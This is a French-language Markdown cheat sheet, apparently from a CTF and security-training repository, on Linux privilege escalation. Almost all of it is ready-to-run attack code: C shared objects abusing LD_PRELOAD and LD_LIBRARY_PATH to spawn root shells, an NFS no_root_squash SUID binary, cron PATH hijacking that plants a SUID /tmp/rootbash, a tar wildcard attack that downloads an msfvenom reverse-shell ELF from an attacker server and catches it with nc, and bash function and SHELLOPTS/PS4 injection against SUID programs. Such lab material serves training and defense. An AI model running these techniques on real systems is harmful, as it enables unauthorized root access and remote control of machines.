# Linux

Des techniques pour de la PrivEsc sur linux !

- [Commande find](#Commande-find)
- [LD_PRELOAD](#ld_preload)
- [NFS](#NFS)
- [Environment Variables](#Environment-Variables)
- [Apache2 & LD_LIBRARY_PATH](#Apache2-&-LD_LIBRARY_PATH)
- [Cron Jobs PATH Environment Variable](#Cron-Jobs-PATH-Environment-Variable)
- [Cron Jobs Wildcard](#Cron-Jobs-Wildcard)
- [Executables Shared Object Injection](#Executables-Shared-Object-Injection)
- [Executables - Environment Variables ](#Executables---Environment-Variables)

## Commande find

```
- find . -name flag1.txt: find the file named “flag1.txt” in the current directory
- find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
- find / -type d -name config: find the directory named config under “/”
- find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
- find / -perm a=x: find executable files
- find /home -user frank: find all files for user “frank” under “/home”
- find / -mtime 10: find files that were modified in the last 10 days
- find / -atime 10: find files that were accessed in the last 10 day
- find / -cmin -60: find files changed within the last hour (60 minutes)
- find / -amin -60: find files accesses within the last hour (60 minutes)
- find / -size 50M: find files with a 50 MB size

- find / -type f -perm -04000 -ls 2>/dev/null
- find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 

- find / -writable -type d 2>/dev/null  : Find world-writeable folders
- find / -perm -222 -type d 2>/dev/null : Find world-writeable folders
- find / -perm -o w -type d 2>/dev/null : Find world-writeable folders
- find / -perm -o x -type d 2>/dev/null : Find world-executable folders

Find development tools and supported languages:

- find / -name perl*
- find / -name python*
- find / -name gcc*
```
## LD_PRELOAD

```
The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

## NFS

```
cat /etc/exports
```

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/abe3fe15-addc-4f91-8150-3dd064e5e346)

tout ce qui contient "no_root_squash" est suscpetible de permettre un PrivEsc.
<br>
Pour checker les repertoires à distance
[Attaquant]
```
showmount -e <ip_distante>
```
```
mount -o rw <ip_distante>:/backups /tmp/backup
```
Script 'privEsc.c'

```
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

```
gcc privEsc.c -o privEsc -w
chmod +s privEsc
```

[Victime]
```
./privEsc
```
<br>
<br>

## Environment Variables

Quand `sudo -l` si LD_PRELOAD ou LD_LIBRARY_PATH, qui sont des librairies partagées, il est possible de faire un PrivEsc avec 

Créer un objet partagé dans le répertoire `/home/user/tools/sudo/preload.c`
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
Script `preload.c`
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

```
<br>
<br>

## Apache2 & LD_LIBRARY_PATH

Pour savoir quelles librairies sont utilisées avec apache2

```
ldd /usr/sbin/apache2
```
Créer un objet partagé avec le même nom que un de ceux qui ont été affiché

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Lancé apache2 avec sudo 

```
sudo LD_LIBRARY_PATH=/tmp apache2
```

Script `library_path.c`

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

<br>
<br>

## Cron Jobs PATH Environment Variable

Exemple
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

Checker la variable `PATH` dans /etc/crontab, choper un endroit qui est `writable` par notre utilisateur et y créer un petit script `overwrite.sh` dans `/home/user`

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
```
chmod +x overwrite.sh
```

puis 

```
/tmp/rootbash -p
```
<br>
<br>

## Cron Jobs Wildcard

Cas de `tar` (Cf. Crontab au dessus)

```
user@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

[Attaquant]
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
chmod +x /home/user/shell.elf
python -m http.server
```

[Victime] (Cf. <a href="https://gtfobins.github.io/gtfobins/tar/">GTFObins</a>)

```
wget http://IP:8000/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
chmod +x shell.elf
```

[Attaquant]
```
nc -lnvp 1337
```
<br>
<br>

## Executables Shared Object Injection

Utiliser stracer pour voir les appels au objet partagé !

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
<br>
<br>

## Executables - Environment Variables 

Exemple

```
/usr/local/bin/suid-env
```

```
user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
Créer un script qui fais spawn un shell en `C`.
```
gcc -o service /home/user/tools/suid/service.c
```
```
PATH=.:$PATH /usr/local/bin/suid-env
```
<br>
<br>

## SUID / SGID Executables - Abusing Shell Features (#1) 

```
user@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

"In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path."

```
user@debian:~$ /bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
```
/usr/local/bin/suid-env2
```

<br>
<br>

## SUID / SGID Executables - Abusing Shell Features (#2)

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
```
/tmp/rootbash -p
```
NE MARCHE PAS AVEC BASH 4.4 ou plus récent
